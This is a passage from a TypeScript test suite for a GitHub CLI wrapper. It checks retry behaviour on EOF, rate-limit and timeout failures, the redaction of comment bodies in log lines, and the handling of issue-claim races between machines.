      assert.strictEqual((yield* Fiber.join(fiber)).items.length, 1);
      assert.strictEqual(t.inputs.length, 2);
    }),
  );

  it.effect("a paginated read's unexpected EOF is retried", () =>
    Effect.gen(function* () {
      const t = setup(
        fail(1, 'Get "https://api.github.com/repos/rawphp/softfac/labels": unexpected EOF'),
        reply('[{"name":"bug"}]'),
      );
      const fiber = yield* Effect.forkChild(t.ok(t.github.labelNames()), {
        startImmediately: true,
      });
      yield* TestClock.adjust("3 seconds");
      assert.deepStrictEqual(yield* Fiber.join(fiber), ["bug"]);
      assert.strictEqual(t.inputs.length, 2);
    }),
  );

  it.effect("a read that ends in unexpected EOF on all five attempts returns that failure", () =>
    Effect.gen(function* () {
      const eof = 'Post "https://api.github.com/graphql": unexpected EOF';
      const t = setup(fail(1, eof), fail(1, eof), fail(1, eof), fail(1, eof), fail(1, eof));
      const fiber = yield* Effect.forkChild(t.err(t.github.listIssues("ready")), {
        startImmediately: true,
      });
      yield* TestClock.adjust(2_000 + 5_000 + 15_000 + 30_000 + 4_000);
      const error = yield* Fiber.join(fiber);
      assert.strictEqual(t.inputs.length, 5);
      assert.strictEqual(error._tag, "GitHubFailed");
      if (error._tag === "GitHubFailed") assert.strictEqual(error.stderr, eof);
    }),
  );

  it.effect("a write's unexpected EOF is not retried: GitHub may have applied it", () =>
    Effect.gen(function* () {
      const t = setup(fail(1, 'Post "https://api.github.com/graphql": unexpected EOF'), reply(""));
      const error = yield* t.err(t.github.postComment(6, "hello"));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.strictEqual(t.inputs.length, 1);
    }),
  );

  it.effect("a rate limit and a timed-out call are not retried", () =>
    Effect.gen(function* () {
      // Even when its stderr also carries a not-received phrase: the rate limit decides.
      const limited = setup(
        fail(1, "net/http: TLS handshake timeout\nHTTP 429: API rate limit exceeded"),
        reply(LIST_ONE),
      );
      assert.strictEqual(
        (yield* limited.err(limited.github.listIssues("ready")))._tag,
        "GitHubRateLimited",
      );
      assert.strictEqual(limited.inputs.length, 1);
      const slow = setup(timedOut(), reply(LIST_ONE));
      assert.strictEqual((yield* slow.err(slow.github.listIssues("ready")))._tag, "GitHubTimedOut");
      assert.strictEqual(slow.inputs.length, 1);
    }),
  );

  it.effect("the retry log line shows a comment body as its size, not its text", () =>
    Effect.gen(function* () {
      const texts: Array<string> = [];
      const capture = Logger.make(({ message }) => {
        texts.push(String(Array.isArray(message) ? message[0] : message));
      });
      const t = setup(fail(1, TLS), reply(""));
      const fiber = yield* Effect.forkChild(
        t
          .ok(t.github.commentOnPr(5, "a hidden review body"))
          .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
        { startImmediately: true },
      );
      yield* TestClock.adjust("3 seconds");
      yield* Fiber.join(fiber);
      assert.strictEqual(t.inputs.length, 2);
      assert.strictEqual(texts.length, 1);
      assert.match(
        texts[0]!,
        /^`gh pr comment 5 --repo rawphp\/softfac --body <\d+ bytes>` attempt 1/,
      );
      assert.notInclude(texts[0]!, "hidden review body");
    }),
  );

  it.effect("a claim whose edit GitHub never received views the assignees again first", () =>
    Effect.gen(function* () {
      const edit = editCall(
        "--add-assignee",
        "rawphp",
        "--remove-label",
        "factory:ready",
        "--add-label",
        "factory:triage",
      );
      const view = ["issue", "view", "6", "--repo", REPO, "--json", "assignees"];
      // Another machine claimed the issue while this one waited to try again.
      const lost = setup(
        reply('{"assignees":[]}'),
        claimPosted(50),
        claimList(claimRow(50, "mac-mini", CLAIMED_AT)),
        fail(1, TLS),
        reply('{"assignees":[{"login":"b"}]}'),
      );
      const lostFiber = yield* Effect.forkChild(lost.ok(claim6(lost)), { startImmediately: true });
      yield* TestClock.adjust("3 seconds");
      assert.deepStrictEqual(yield* Fiber.join(lostFiber), {
        kind: "skipped-assigned",
        assignees: ["b"],
      });
      assert.deepStrictEqual(lost.calls(), [view, claimPostCall(), claimListCall, edit, view]);
      // Nobody did, so the second attempt claims it, without posting a second claim comment.
      const won = setup(
        reply('{"assignees":[]}'),
        claimPosted(50),
        claimList(claimRow(50, "mac-mini", CLAIMED_AT)),
        fail(1, TLS),
        reply('{"assignees":[]}'),
        claimList(claimRow(50, "mac-mini", CLAIMED_AT)),
        reply(""),
      );
      const wonFiber = yield* Effect.forkChild(won.ok(claim6(won)), { startImmediately: true });
      yield* TestClock.adjust("3 seconds");
      assert.deepStrictEqual(yield* Fiber.join(wonFiber), { kind: "claimed" });
      assert.deepStrictEqual(won.calls(), [
        view,
        claimPostCall(),
        claimListCall,
        edit,
        view,
        claimListCall,
        edit,
      ]);
    }),
  );
});
